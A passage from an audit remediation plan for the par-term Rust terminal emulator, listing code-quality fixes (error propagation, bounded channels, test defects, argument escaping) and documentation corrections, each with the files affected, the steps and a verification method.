  plans. Then add a CI line-count check (see ENH-009) so the signal is mechanical.
- **Method**: Every one understates: `renderer/mod.rs` claims 743 (actual **798** — two lines under threshold
  while advertising 55 lines of headroom), `rendering.rs` 705/**796**, `graphics_renderer.rs` 726/**771**,
  `cell_renderer/mod.rs` 742/**766**, `background.rs` 693/**701**. A hand-maintained number that no process
  updates is worse than none — it reads as a fresh measurement. Same reasoning as ARC-005 and DOC-011: delete
  rather than refresh. **Depends on ARC-004** for `rendering.rs`/`cell_renderer/mod.rs` — re-read first.
- **Verify**: `make checkall`; `wc -l` on all five confirms the comments are gone rather than corrected.

### [QA-024] Move `cache_hit` out of `DebugState` *(fix with QA-002)*
- **Files**: `src/app/window_state/debug_state.rs:4-8,17`; readers at
  `src/app/render_pipeline/gather_phases.rs:184,221,243,259`, `renderer_ops.rs:96`, `gather_data.rs:125`
- **Steps**: Create a `FrameState` (or `RenderDecisions`) struct, move `cache_hit` into it, update all six
  sites, and co-locate QA-002's `overlay_scratch` buffer there.
- **Method**: The struct doc says "Timing metrics and FPS overlay state… toggled with F3", but the field
  **drives behavior** — it gates `update_cells` (`renderer_ops.rs:96`), URL detection
  (`gather_phases.rs:184`), and cache flush (`:243`). So gating `DebugState` behind a debug feature or removing
  the FPS overlay would silently break rendering. Related to QA-002: `cache_hit = false` at `:221` forces
  `flush_cell_cache` to run `Arc::new(cells.to_vec())` at `:259` **every frame the search overlay is open** — a
  second full-grid clone from the same cause. That is why these two are one change.
- **Verify**: `make checkall`; rendering identical with the F3 overlay both on and off; search overlay open
  shows no per-frame full-grid clone.

### [QA-025] Make `pane_manager` non-`Option` and delete ten `expect`s
- **Files**: `src/tab/mod.rs:89`; `src/tab/pane_accessors.rs:3,28,39,57,67,77,87,97,107,117,127`;
  constructors at `src/tab/constructors.rs:220,451,497`; assertions at
  `src/app/handler/window_state_impl/shell_exit.rs:24,41`
- **Steps**: Change the field to `PaneManager`, update the three constructors (all already build one), delete
  the ten `.expect("… (R-32)")` calls, and simplify the two `shell_exit.rs` assertions.
- **Method**: Invariant R-32 says the field is always `Some` — documented at `pane_accessors.rs:3` and
  `pane/manager/mod.rs:95`, asserted at two sites, satisfied by all three constructors. The `Option` buys
  nothing and is paid for with ten identical panicking bridges. Making it non-`Option` converts a
  runtime-documented invariant into a compiler-enforced one, which is strictly better and removes ten panic
  sites in one change.
- **Verify**: `make checkall`; `grep -c "R-32" src/tab/pane_accessors.rs` returns 0.

### [QA-026] Move the transfer notification inside the lock gate
- **Files**: `src/app/file_transfers/mod.rs:184-193`
- **Steps**: Move `deliver_notification(...)` and the `last_completion_time` update **inside** the
  `if let Ok(term) = terminal_arc.try_read()` block that guards `take_completed_transfer`.
- **Method**: `check_file_transfers()` runs every `about_to_wait()`. When `try_read` fails under contention the
  take is skipped but the notification still fires and the record persists, so the next poll re-notifies —
  producing repeat spam rather than a single message. **Conflict file**: SEC-010 (Phase 1) also edits this file;
  re-read before editing.
- **Verify**: `make checkall`; trigger a failing transfer under load and confirm exactly one notification.

### [QA-027] Remove the `#[allow(unreachable_patterns)]` wildcard arms
- **Files**: `par-term-terminal/src/terminal/rendering.rs:385,412` (inside
  `convert_term_cell_with_theme`, `:346`)
- **Steps**: Delete the `_ => theme.foreground` / `_ => theme.background` arms and the two `allow` attributes,
  leaving the exhaustive 16-variant matches.
- **Method**: `par-term-emu-core-rust-0.45.0/src/color.rs`'s `NamedColor` has exactly 16 variants, so `_` is
  unreachable today and the `allow` exists only to silence that. But the dependency floats on
  `version = "0.45"` (`Cargo.toml:12`), so a new upstream variant becomes reachable, stays silenced, and
  renders as theme foreground — a silent wrong color instead of a compile error. Removing the arm converts a
  future silent bug into a build failure, which is the point.
- **Verify**: `make checkall`; `cargo build` fails informatively if a variant is added upstream.

### [QA-028] Bound the unbounded channels *(scope AFTER QA-012)*
- **Files**: `par-term-acp/src/jsonrpc.rs:131`; `src/app/window_state/impl_agent.rs:218`;
  `src/profile/dynamic/manager.rs:64`; `src/app/window_manager/mod.rs:132`; `src/platform/notify.rs:225`
- **Steps**: First confirm QA-012 has landed. Then convert the ACP channels to bounded
  (`mpsc::channel(N)`) with an explicit overflow policy — drop-oldest with a warning, or backpressure the
  reader. Leave the notification channel unless it demonstrably grows.
- **Method**: `jsonrpc.rs:131` is fed by the agent subprocess's stdout, so a verbose or runaway agent grows the
  queue without bound — and combined with QA-012's rendering-gated drain it grew **only while unfocused**, i.e.
  exactly when nothing was consuming. QA-012's unconditional drain removes most of the pressure, so re-measure
  before adding bounds; a bounded channel with a bad policy can drop agent responses, which is worse than the
  memory growth.
- **Verify**: `make checkall`; `make acp-smoke` with a high-output agent, confirming no unbounded growth and no
  dropped responses.

### [QA-029] Make `logs_dir()` return a `Result` *(sequence AFTER QA-023)*
- **Files**: `par-term-config/src/config/persistence.rs:236-243`
- **Steps**: Confirm QA-023 has extracted its helper from this file first. Then change the signature to
  `Result<PathBuf, io::Error>`, propagate the `create_dir_all` failure, and surface it at the session-logging
  call sites instead of warning and continuing.
- **Method**: It warns then returns the path anyway, so session logging — a documented feature — silently
  no-ops with only a `warn!` line. **Ordering matters**: QA-023 extracts the atomic-save helper from this same
  file, so changing this signature first guarantees a conflict.
- **Verify**: `cargo test -p par-term-config`; `make checkall`; make the log directory unwritable and confirm a
  user-visible error.

### [QA-030] Surface session-logger write failures
- **Files**: `src/session_logger/core.rs:456,464`; `is_active()` in the same module
- **Steps**: Replace `let _ = writer.write_all(..)` with error handling that records a failed state, and make
  `is_active()` reflect writer health rather than only the internal flag.
- **Method**: The UI claims logging is active while the transcript silently truncates — disk full, or the log
  file deleted mid-session. The user discovers it only when reading an incomplete transcript later, which is
  the worst possible time.
- **Verify**: `make checkall`; delete the log file mid-session and confirm the UI reports logging stopped.

### [QA-031] Propagate startup shader-load failures to the existing error sink
- **Files**: `par-term-render/src/renderer/shaders/background.rs:100-108`;
  `par-term-render/src/renderer/shaders/cursor.rs:83-91`; callers at
  `par-term-render/src/renderer/mod.rs:418,442`
- **Steps**: Replace the `log::info!`-only failure path with the same propagation the runtime reload path in
  these very files uses to reach `settings_window.set_shader_error(..)`.
- **Method**: The same failure is surfaced or swallowed purely based on **when** it happens — a broken shader
  at startup silently degrades to an unshaded terminal with no diagnostic, while the identical failure on
  hot-reload shows an error. The correct behavior already exists a few lines away.
- **Verify**: `make checkall`; start with a deliberately broken `custom_shader` and confirm the Settings window
  shows the error.

### [QA-032] Clear `command_history`'s `dirty` flag only after a successful write
- **Files**: `src/command_history.rs:118-120`; caller at `src/app/window_state/impl_helpers.rs:273`
- **Steps**: Move the `dirty = false` assignment after a confirmed successful write, and handle the spawn's
  `Result` rather than discarding it.
- **Method**: The sole caller is `WindowState::drop`, so a shutdown-time spawn failure under resource pressure
  loses the session's history with no retry path — `dirty` is already false, so nothing knows to try again.
  Clearing state before the operation that justifies it is the bug.
- **Verify**: `make checkall`; simulate a spawn failure and confirm `dirty` stays set.

### [QA-033] Fix the four test-quality defects
- **Files**: `tests/snippets_tests.rs:687-731`; `tests/profiles/profile_modal_tests.rs:118-134,186-200,349-395,713-730`;
  `par-term-keybindings/tests/keybinding_integration_tests.rs:165-201,207-265`
- **Steps**: (a) Rewrite `snippets_tests.rs:687-731` to call the real `import_snippets`
  (`par-term-settings-ui/src/snippets_tab/io.rs:40`) instead of reimplementing dedup inline — that leaves
  `io.rs:66-69`'s keybinding-conflict clearing with **zero coverage** while appearing to test import.
  (b) Either assert real state in the three `profile_modal_tests` delete tests or rename them to match what
  they check (`modal.visible` only). (c) Delete or strengthen the tautological tests at `:118-134`, `:186-200`,
  `:713-730` (constructing an enum variant and matching it against itself proves nothing).
  (d) Table-drive the 16 near-duplicate alias tests, following the same file's existing pattern at
  `:301-328,466-482`.
- **Method**: (a) is the real defect — a test that *looks* like coverage but exercises a copy of the logic is
  worse than a missing test, because it suppresses the instinct to write one. (b)–(d) are honesty and
  maintenance.
- **Verify**: `make checkall`; confirm `io.rs:66-69` is now executed (coverage or a deliberate assertion).

### [QA-034] Add justifications to the eight bare `#[allow(...)]`
- **Files**: `src/app/window_state/notifications.rs:170`; `par-term-render/src/renderer/graphics.rs:463`;
  `src/app/render_pipeline/gpu_submit.rs:47`; `src/app/render_pipeline/renderer_ops.rs:87`;
  `par-term-mcp/src/ipc.rs:46`; `src/url_detection/mod.rs:24`; `par-term-config/src/lib.rs:307,309`
- **Steps**: Add a one-line reason to each, matching the style of the ones that have it
  (`src/app/triggers/mod.rs:659`, `snippet_actions/split_pane.rs:11`). Where the lint can be fixed instead,
  fix it.
- **Method**: 35 `allow`s exist and most carry a reason, so these eight are the inconsistency. **Do not touch
  `src/menu/mod.rs:42`** — that `#[cfg_attr(…, allow(dead_code))]` is a deliberate, board-tracked silencer for
  the Linux menu item. **Conflict**: `par-term-mcp/src/lib.rs` is SEC-007's file (Phase 1); re-read.
- **Verify**: `make lint-all`; every `allow` in the repo has an adjacent reason.

### [QA-035] Convert `#[ignore]` comments to `#[ignore = "reason"]`
- **Files**: `tests/terminal_tests.rs:45,54,63,82,149,163`;
  `tests/tabs/tab_stability_tests.rs:415,426,436,446`; correct example at `src/tab/manager.rs:546`
- **Steps**: Move each trailing `// comment` into the attribute as `#[ignore = "requires PTY spawn"]`, matching
  `src/tab/manager.rs:546`.
- **Method**: Cargo prints the attribute's string but not the comment, so today the reason is invisible in test
  output and someone re-enabling a test cannot see why it was skipped. There are zero bare unexplained ignores,
  so this is purely making existing information visible.
- **Verify**: `cargo test --workspace -- --ignored --list` shows a reason for each of the 11.

### [QA-036] Fix CLAUDE.md's false `log::` claim — **two sites**
- **Files**: `CLAUDE.md:60`, `CLAUDE.md:239`
- **Steps**: Rewrite both. `:60` says "Do NOT use `log::info!()` etc. — they won't appear in the debug log";
  `:239` says "`log::info!()` etc. go to stdout, NOT the debug log". Replace with: both the `crate::debug_*!`
  macros and `log::` reach `<temp_dir>/par_term_debug.log`; prefer `crate::debug_*!` in the **root** crate for
  `DEBUG_LEVEL`/category control; sub-crates **must** use `log::` because `crate::debug_info!` resolves to
  their own crate root; only `log::debug!`/`trace!` require `RUST_LOG`.
- **Method**: Verified: `src/debug.rs:253` defines `LogCrateBridge`, `:308` implements `log::Log` for it,
  `src/main.rs:45` installs it via `init_log_bridge`, and `:281-283` defaults to `LevelFilter::Info` when
  `RUST_LOG` is unset. `debug.rs:3-48` documents the dual system as deliberate. **The consequence of leaving
  this wrong is worse than the doc error**: it invites a future agent to "fix" ~1,000 correct `log::` call
  sites, including in sub-crates where the macros cannot compile. Batch with the other CLAUDE.md edits.
- **Verify**: read `:60` and `:239` against `src/debug.rs:253-352`. No build impact.

### [QA-037] Bound the `git rev-parse` subprocess
- **Files**: `src/app/input_events/snippet_actions/workflow.rs:268-277`;
  `par-term-config/src/snippets.rs:1004-1024`
- **Steps**: Add a timeout (reuse QA-020's `shell_command.rs` loop) or move the call off the keybinding path
  and cache the result per working directory.
- **Method**: Sub-millisecond normally, unbounded with a network-mounted `.git` or a stale `index.lock` — and
  it runs on the main thread from a keybinding, so the failure mode is a frozen UI.
- **Verify**: `make checkall`; simulate a slow `.git` and confirm the UI stays responsive.

### [QA-038] Bound the `tmux list-sessions` subprocess
- **Files**: `src/tmux_session_picker_ui.rs:104`
- **Steps**: Move the call off the egui closure into a background task and render from cached results with a
  loading state.
- **Method**: It runs inside the egui closure on first show and on Refresh, so an unresponsive tmux server
  blocks the frame.
- **Verify**: `make checkall`; open the picker with no tmux server running and confirm no hang.

### [QA-039] Log the theme fallback
- **Files**: `par-term-config/src/config/theme_methods.rs:91`
- **Steps**: Replace `Theme::by_name(&self.theme).unwrap_or_default()` with a match that logs the unknown name
  before falling back.
- **Method**: A misspelled `theme:` silently becomes `default_dark` with no diagnostic, unlike every other
  fallback in this crate — so the user sees the wrong colors and has no signal why.
- **Verify**: `cargo test -p par-term-config`; set `theme: nonexistent` and confirm a warning.

### [QA-040] Escape arguments in the five tmux command builders
- **Files**: `par-term-tmux/src/commands.rs:49,55,62,79,96`
- **Steps**: Apply the `'\''` escape idiom that `send_keys`/`send_literal`/`set_buffer` in the same file already
  use, to `attach_session`, `new_session`, `kill_session`, `new_window`, `rename_window`.
- **Method**: Confirmed **none of the five is called outside tests today** — live paths use separately-escaped
  `format!` calls in `session.rs`/`gateway.rs` — so this is a latent public-API defect, not a live bug. Worth
  fixing because it is public API on a published crate and the correct idiom is already in the file; do not
  rate it as an exploitable injection.
- **Verify**: `cargo test -p par-term-tmux`; unit-test a session name containing a single quote.

---

# Phase 3d — Documentation (Parallel)

> **Run DOC-022 first.** It adds the link validation that DOC-002/003/016 depend on; without it the same drift
> silently reaccumulates.
>
> **`CLAUDE.md` is a single-owner batch.** DOC-006, DOC-007, DOC-011, DOC-015, DOC-018, DOC-023 plus QA-036,
> ARC-008, ARC-012 all edit it. Make one change.
>
> **Do NOT touch** `docs/features/CUSTOM_SHADERS.md:1099-1100` or `CLAUDE.md:218` — a concurrent session owns
> them (SEC-006).

### [DOC-022] Add link validation to CI — **do this first**
- **Files**: `.github/workflows/ci.yml`; optionally a `Makefile` target
- **Steps**: Add a `lychee` (or `markdown-link-check`) job over `**/*.md` with a pinned action SHA per the
  repo's convention. Configure it to catch relative-path failures **and** broken internal anchors. Add a
  `make doc-check` target — `docs/API.md:8-14` already proposes exactly this.
- **Method**: This absence is the **root enabler** of DOC-002 (51 broken links), DOC-003 (11 misroutes), and
  DOC-016 (5 anchors) — `docs/DOCUMENTATION_STYLE_GUIDE.md:553` even recommends it. It is the only
  documentation item that prevents recurrence rather than fixing a symptom. Expect the first run to fail; that
  is the point. Note it will **not** catch DOC-003, whose targets exist — see that entry.
- **Verify**: the job fails on current `main`, and passes after DOC-002/003/016 land.

### [DOC-001] Correct the four `CONFIG_REFERENCE.md` enum value-sets
- **Files**: `docs/CONFIG_REFERENCE.md:186,266,268,537`; types at
  `par-term-config/src/types/unicode.rs:17-18,80-104`, `types/integration.rs:115-121`, `types/font.rs:56`
- **Steps**:
  1. `:268` `normalization_form` → `NFC`, `NFD`, `NFKC`, `NFKD`, `none`. `unicode.rs:80-104` has **no**
     `rename_all`; only `None` carries `#[serde(rename = "none")]`. The documented default is among the wrong
     values.
  2. `:266` `unicode_version` → `unicode9` … `unicode16` (snake_case on `Unicode9`..`Unicode16` gives no
     underscore before the digit), and add the missing real `unicode15_1`.
  3. `:537` `progress_bar_style` → `bar`, `barwithtext` (`rename_all = "lowercase"` on `BarWithText`).
  4. `:186` `download_save_location` → document the newtype tag syntax `!custom /path` for `Custom(String)`.
- **Method**: Read the enum and its serde attributes for each — the attribute, not the variant name, decides
  the wire value, which is exactly what went wrong here. Unlike `docs/API.md`, this file has no staleness
  disclaimer, so users trust it. Do **not** hand-transcribe a fifth time; where possible verify each corrected
  value by round-tripping it.
- **Verify**: put each corrected value in a scratch `config.yaml` and confirm `Config::load` succeeds:
  `cargo test -p par-term-config`.

### [DOC-002] Rewrite the 51 broken doc links
- **Files**: `SECURITY.md:147-156`; all 13 `par-term-*/README.md` (line lists in AUDIT.md);
  `examples/README.md:225`; `docs/plans/README.md:27,28`
- **Steps**: Apply the mechanical rewrites in AUDIT.md's DOC-002 remedy:
  `../docs/{ARCHITECTURE,CRATE_STRUCTURE,COMPOSITOR}.md` → `../docs/architecture/…`;
  the 12 feature docs → `../docs/features/…`; `{KEYBOARD_SHORTCUTS,QUICK_START_FONTS}.md` →
  `../docs/guides/…`; in `SECURITY.md` drop the leading `../`; in `docs/plans/README.md` use
  `../architecture/…`.
- **Method**: **Do not touch** `../docs/{ASSISTANT_PANEL,ACP_HARNESS,CONFIG_REFERENCE}.md` — already correct.
  Re-derive line numbers with `grep -n` rather than trusting any tool that reports section starts. These are
  the published crate front pages, so every broken link renders on crates.io and docs.rs.
- **Verify**: the DOC-022 link job passes; `grep -rn "\.\./docs/[A-Z]" --include='*.md' .` returns only the
  three correct paths.

### [DOC-003] Fix the 11 `../README.md` misroutes
- **Files**: the 10 files listed in AUDIT.md's DOC-003 entry
- **Steps**: Change every `](../README.md)` under `docs/guides/` and `docs/features/` (and
  `docs/architecture/COMPOSITOR.md:775`) to `](../../README.md)`.
- **Method**: These are invisible to link checkers **because the target exists** — `../README.md` resolves to
  `docs/README.md` (6.7 KB index) instead of the root `README.md` (28 KB). So DOC-022 will not catch them;
  this one is manual. Intent is proven by the link text (`GETTING_STARTED.md:98` promises installation and
  Gatekeeper troubleshooting, which live only in the root README), and corroborated by `docs/README.md` having
  an inbound doc-link degree of exactly 11. **Caution**: `CUSTOM_SHADERS.md:1109` is this issue; `:1099-1100`
  is SEC-006's and off-limits.
- **Verify**: `grep -rn "](\.\./README\.md)" docs/` returns 0; spot-check that two now land on the 28 KB file.

### [DOC-004] Document that the menu bar is not attached on Linux — ✅ DONE
> Shipped in `d1bf97c3` + `f988ab70`. Every file and step below was carried out, including the
> rustdoc at `src/menu/linux.rs`. One correction to the steps: the menu-only shortcut list is
> `new_window`, `close_window`, `quit`, `select_all` — `close_window` was missing here, and
> `save_arrangement` IS bindable so it is not stranded. Do not redo; revert the caveats when the
> Linux menu code card lands.

- **Files**: `docs/architecture/ARCHITECTURE.md:230`; `docs/features/INTEGRATIONS.md:152`;
  `docs/guides/TROUBLESHOOTING.md:621`; `docs/features/ARRANGEMENTS.md:104`;
  `docs/guides/KEYBOARD_SHORTCUTS.md:25,29,39,68`; **rustdoc** at `src/menu/linux.rs:11,32`
- **Steps**: Reword `ARCHITECTURE.md:230` to state Linux menus are not attached. Add a Linux caveat plus the
  CLI/Settings alternative at the three procedural sites. Mark the four menu-only shortcuts as unavailable on
  Linux. Fix the rustdoc at `src/menu/linux.rs:11` ("Attach the menu bar to a Linux window") and `:32` (logs
  "Linux menu bar initialized (GTK-based)") to match `src/menu/mod.rs:40-41`.
- **Method**: `src/menu/linux.rs:16-33` only calls `log::info!`; `grep -rn 'init_for_gtk_window' src/` returns
  nothing. The rustdoc fix is correct **regardless** of whether the board's code item ever lands, because it
  contradicts `mod.rs:40-41` in the same module today. The doc caveats are the reversible part — leave a note
  for whoever closes the code card to revert them. `TROUBLESHOOTING.md` is the highest-impact site: it is where
  a stuck user goes.
- **Verify**: `make checkall` (the rustdoc edit touches Rust source).

### [DOC-005] Remove the fictional XDG section
- **Files**: `docs/guides/ENVIRONMENT_VARIABLES.md:88,92,93,94,95,96`
- **Steps**: Rewrite `:88-96` to state par-term uses a fixed `~/.config/par-term/` on Linux and macOS and does
  **not** consult XDG variables. Remove `XDG_DATA_HOME`, `XDG_STATE_HOME`, `XDG_CACHE_HOME`, `XDG_RUNTIME_DIR`
  entirely — they are read nowhere.
- **Method**: `par-term-config/src/config/persistence.rs:186-190` hardcodes the path; the only
  `XDG_CONFIG_HOME` reads in the workspace are `env_vars.rs:45` (a pass-through allowlist entry, not path
  resolution) and `shell_integration_installer.rs:248` (shell RC files only). The comment at
  `persistence.rs:185` — "Use XDG convention on all platforms" — shows the confusion: it follows the default
  *path* but not the *specification*. **Doc-only by deliberate choice**: honoring the variable is a behavior
  change, tracked as ENH-008. Documenting reality is the honest short-term fix.
- **Verify**: set `XDG_CONFIG_HOME` to a scratch directory, launch, and confirm behavior matches the new text.

### [DOC-006] Fix the debug log path in 11 sites
- **Files**: `CLAUDE.md:49`; `CONTRIBUTING.md:205`; `docs/LOGGING.md:162,181,184,187,197,264`;
  `docs/guides/ENVIRONMENT_VARIABLES.md:37,40`; `Makefile:13`
- **Steps**: Replace literal `/tmp/par_term_debug.log` with `"$TMPDIR"/par_term_debug.log` in the shell
  examples (or point readers at `make tail-log`). Change `Makefile:13` to resolve the temp directory rather
  than hardcoding `/tmp`.
- **Method**: `src/debug.rs:97` and `:224` use `std::env::temp_dir()`, and `src/debug.rs:43` documents it
  correctly — so **the code is right and only the docs are wrong**. Do not "fix" `src/debug.rs`.
  `docs/LOGGING.md:134` is already correct; leave it. Verified empirically: `/tmp/par_term_debug.log` does not
  exist while `$TMPDIR/par_term_debug.log` does. **Distinct from SEC-006** (shader dump, where the code *is*
  wrong) — no dependency. **`Makefile` is a conflict file** (SEC-026, DOC-015).
- **Verify**: `make tail-log` finds the live log on macOS.

### [DOC-007] Fix the CLAUDE.md concurrency gotcha
- **Files**: `CLAUDE.md:238`
- **Steps**: Rewrite for `tokio::sync::RwLock` using `try_read()`/`try_write()`/`blocking_read()`/
  `blocking_write()`, and point at `docs/architecture/MUTEX_PATTERNS.md` instead of the nonexistent
  `MEMORY.md`.
- **Method**: `src/tab/mod.rs:80` is `Arc<RwLock<TerminalManager>>` with `:38` importing `tokio::sync::RwLock`
  — which has **no** `try_lock()` or `blocking_lock()`, so the current guidance produces code that does not
  compile. `MUTEX_PATTERNS.md:119,149` and `CONCURRENCY.md:108,131,132` are already correct; copy their
  vocabulary rather than inventing it. This is the highest-leverage doc fix in the audit because CLAUDE.md is
  the first file every AI session reads and it actively overrides the correct guidance.
- **Verify**: read against `MUTEX_PATTERNS.md`; `git ls-files | grep MEMORY.md` returns nothing, so the new
  text must not reference it.

### [DOC-008] Correct the four wrong keyboard shortcuts
- **Files**: `docs/guides/KEYBOARD_SHORTCUTS.md:65,67,146,177`
- **Steps**: `:67` — document the real macOS chord (`primary_modifier_with_shift` requires
  `super && shift && !control`, per `src/platform/modifiers.rs:56-57`). `:146` — Shift+F11 toggles fullscreen
  because `keyboard_handlers.rs:19` matches bare `NamedKey::F11`; document that or add the modifier guard.
  `:65` and `:177` — **decide the intended behavior first**: Cmd+`,` is intercepted for Settings
  (`keyboard_handlers.rs:48-51`) before reaching the cursor-style cycler, and Cmd+Shift+P is bound to
  `manage_profiles` in `src/menu/mod.rs:197-203`. Fix code or doc deliberately.
- **Method**: Defaults live in `par-term-config/src/defaults/misc.rs:34`, **not** `par-term-keybindings/`
  (which only parses and matches) — look in the right place. `:65` and `:177` are genuine code conflicts, not
  doc typos, so editing the table alone would document a bug as a feature. This doc has inbound doc-link degree
  30, the highest in the repo.
- **Verify**: press each of the four chords on macOS and confirm the documented behavior.

### [DOC-009] Regenerate the 11 wrong API.md enum variant lists
- **Files**: `docs/API.md:99,109,117,118,121,159,161,176,188,234,395`
- **Steps**: For each, read the type and transcribe its real variants:
  `LinkUnderlineStyle` → `Solid, Stipple` (`types/terminal.rs:279`);
  `TabStyle` → `Dark, Light, Compact, Minimal, Automatic, HighContrast` (`types/tab_bar.rs:15`);
  `AmbiguousWidth` → `Narrow, Wide` (`types/unicode.rs:66`); plus `TmuxConnectionMode`, `TriggerSplitTarget`,
  `TabBarMode`, `NewTabPosition` (`End`, not `AtEnd`), `SliderScale` (`Log`, not `Logarithmic`).
- **Method**: All 317 API.md rows resolve to real public items, so this is **description-only** drift — do not
  restructure the file. All the affected enums are `Serialize/Deserialize` with `rename_all = "snake_case"`, so
  they are `config.yaml`-facing and wrong values cause parse failures.
- **Verify**: `cargo test -p par-term-config`; spot-check two corrected values by round-tripping them.

### [DOC-010] Fix the inverted `check_command_allowlist` contract
- **Files**: `docs/API.md:192,193`
- **Steps**: `:193` → `check_command_allowlist(command: &str, allowed_commands: &[String]) -> Result<(), String>`,
  where `Ok(())` means allowed. `:192` → `check_command_denylist` returns `Option<&'static str>`
  (`automation.rs:401`), where `Some(reason)` means denied.
- **Method**: "Returns `true` if the command is on the security allowlist" is dangerous rather than merely
  wrong: a caller reading a `Result` as boolean-ish gets the check **backwards** and fails **open** on a
  security allowlist. State the success semantics explicitly, not just the type.
- **Verify**: read both rows against `par-term-config/src/automation.rs:401,508`.

### [DOC-011] Remove CLAUDE.md's stale version line
- **Files**: `CLAUDE.md:12` (and the `sed` reminder at `:13-14`)
- **Steps**: **Delete** `**Version**: 0.36.0` and the accompanying `sed` reminder. If the line is kept instead,
  set it to `0.37.1` **and** fix the reminder so the release checklist actually runs it.
- **Method**: Deletion is preferred over updating.
  `docs/DOCUMENTATION_STYLE_GUIDE.md:224` advises against duplicating versions outside manifests and
  changelogs, and this field has no consumer while `Cargo.toml:99`, `CHANGELOG.md:19`, the `v0.37.1` tag, and
  `README.md:44` all already agree. Updating the number resets the clock; deleting removes the failure mode.
  `CONTRIBUTING.md:474` mandates the sync check that was skipped.
- **Verify**: `grep -n "^\*\*Version\*\*" CLAUDE.md` returns nothing (or `0.37.1`).

### [DOC-012] Correct the two silently-ignored config values
- **Files**: `docs/CONFIG_REFERENCE.md` (`ai_inspector_default_scope`, `ai_inspector_view_mode` rows)
- **Steps**: Read the two enums and transcribe their real serde values.
- **Method**: These deserialize to the **default** instead of erroring, so the user gets no feedback at all —
  harder to diagnose than DOC-001's hard failure, which is why it is worth fixing in the same pass.
- **Verify**: set each documented value and confirm it takes effect rather than silently defaulting.

### [DOC-013] Repair the orphaned table rows
- **Files**: `docs/CONFIG_REFERENCE.md:98-107`
- **Steps**: Either move the `> **v0.30.0:**` blockquote at `:99-101` above the table, or start a new table at
  `:102` with its own header and `|---|` separator so `font_antialias`, `font_hinting`, `font_thin_strokes`, and
  `minimum_contrast` render.
- **Method**: The table ends at `:98`; a blank line plus a blockquote breaks it, so `:102-105` render as
  literal text on GitHub and those four font options are effectively invisible.
- **Verify**: preview the rendered markdown and confirm four rows appear in a table.

### [DOC-014] Fix CONTRIBUTING's crate-count and dependency claims
- **Files**: `CONTRIBUTING.md:367,374`
- **Steps**: `:367` → "13 sub-crates plus the root application crate" (matching `Cargo.toml:2`, the file's own
  layer table at `:373-377`, and `docs/architecture/CRATE_STRUCTURE.md:28`). `:374` → remove the claim that
  `par-term-config` depends on external `par-term-emu-core-rust`; `grep -c 'par-term-emu-core-rust'
  par-term-config/Cargo.toml` returns **0**, and `CLAUDE.md:163` correctly says "none — pure-data crate".
- **Method**: The document contradicts itself — its prose says 14 while its own table sums to 13 — so trust the
  manifest, not either.
- **Verify**: `cargo metadata --no-deps | jq '.packages | length'`.

### [DOC-015] Correct the `make checkall` description
- **Files**: `CLAUDE.md:40`
- **Steps**: Change "Format, lint, typecheck, and test" to "**Check** formatting, lint, typecheck, and test —
  does not modify files", matching `Makefile:213` (`checkall: fmt-check lint typecheck test`).
- **Method**: A developer expecting formatting instead gets an `fmt-check` failure and may then reach for
  `make fmt`, which reformats unrelated files into their diff — the exact hazard the repo warns about.
- **Verify**: compare against `Makefile:213`.

### [DOC-016] Fix the five broken internal anchors
- **Files**: `docs/features/SHADERS.md:12,14,15,17`; `docs/architecture/ARCHITECTURE.md:13`
- **Steps**: In `SHADERS.md`, change the four single-hyphen anchors to doubles (e.g.
  `#terminal-aware--productivity`) to match headings containing `&` at `:29,61,88,108`. In `ARCHITECTURE.md:13`,
  change `#tmux-integration` to `#tmux-integration-par-term-tmux` to match the heading at `:259`.
- **Method**: GitHub's slug rule is one hyphen per space with **no run-collapsing**, so `A & B` yields `a--b`.
  ⚠️ **The many `--` anchors elsewhere in the repo are valid** — do not "normalize" them; that would break
  working links.
- **Verify**: DOC-022's job with anchor checking enabled; click each of the five in the GitHub preview.

### [DOC-017] Fix the README "What's New" ToC anchor
- **Files**: `README.md:19`
- **Steps**: Point it at the current release section, or make it a stable `#whats-new` anchor that does not
  encode a version.
- **Method**: `#whats-new-in-0351` still resolves (the 0.35.1 section survives at `:75`), so no checker flags
  it — but the front-page ToC jumps past four releases. A version-free anchor stops it going stale each
  release, which is the recurrence DOC-030 describes.
- **Verify**: click the ToC entry and confirm it lands on the newest section.

### [DOC-018] Fix CLAUDE.md's file-map errors
- **Files**: `CLAUDE.md:121,208`
- **Steps**: `:121` → `src/tab_bar_ui/` has **9 files, 0 subdirectories** (verify: `ls -d src/tab_bar_ui/*/ |
  wc -l`), not "11 subdirs". `:208` → replace `input_events.rs` with
  `src/app/input_events/keybinding_actions.rs:21`; no `src/input_events.rs` exists.
- **Method**: All 38 other paths in the map resolve, so these two are the outliers. Worth fixing because the
  map is how agents and new contributors navigate — a wrong entry costs a search every time.
- **Verify**: `while read -r p; do [ -e "$p" ] || echo "MISSING $p"; done` over every path in the map.

### [DOC-019] Correct the paste-transform count
- **Files**: `README.md:182`
- **Steps**: Change 28 → **29**, matching `docs/README.md:26` and `docs/features/PASTE_SPECIAL.md:3`.
- **Method**: Confirmed twice — `PasteTransform` enum variants and the `all()` list in
  `src/paste_transform/mod.rs`. README is the sole outlier, so the count is not in dispute.
- **Verify**: count the variants: `grep -c "^    [A-Z]" src/paste_transform/mod.rs` (adjust to the real shape).

### [DOC-020] Fix three code doc comments that state wrong defaults
- **Files**: `par-term-config/src/config/config_struct/window_config.rs:45`;
  `par-term-config/src/config/config_struct/mod.rs:328,1395`
- **Steps**: `window_config.rs:45` "Default: 10" → **8** (`defaults/font.rs:35`). `mod.rs:328` background-image
  default `fit` → **`Stretch`** (`types/rendering.rs:110-111` `#[default]`). `mod.rs:1395` progress-bar default
  `bottom` → **`Top`** (`types/integration.rs:144-145` `#[default]`).
- **Method**: Trust the `#[default]` attribute and the `defaults/` function, not the doc comment. **Unblocked**:
  ARC-003 (which would have moved these declarations) is deferred out of this cycle.
- **Verify**: `cargo test -p par-term-config`; `cargo doc -p par-term-config` and read the three items.

### [DOC-021] Fix API.md's TOML-vs-YAML and parameter errors
- **Files**: `docs/API.md:149,152,165,166`
- **Steps**: Change "Parse TOML metadata" to YAML; correct `parse_shader_metadata` to take `source: &str`
  (`par-term-config/src/shader_metadata/parsing.rs:56`), and document
  `parse_shader_metadata_from_file` separately for the path-taking variant.
- **Method**: `parsing.rs:59` calls `serde_yaml_ng::from_str`, and a case-insensitive grep for `toml` across
  the whole `shader_metadata` module returns **0** — there is no TOML anywhere near this code.
- **Verify**: read the four rows against `shader_metadata/parsing.rs`.

### [DOC-023] Link the Migration Guide
- **Files**: `README.md`; `CLAUDE.md` Docs Reference table
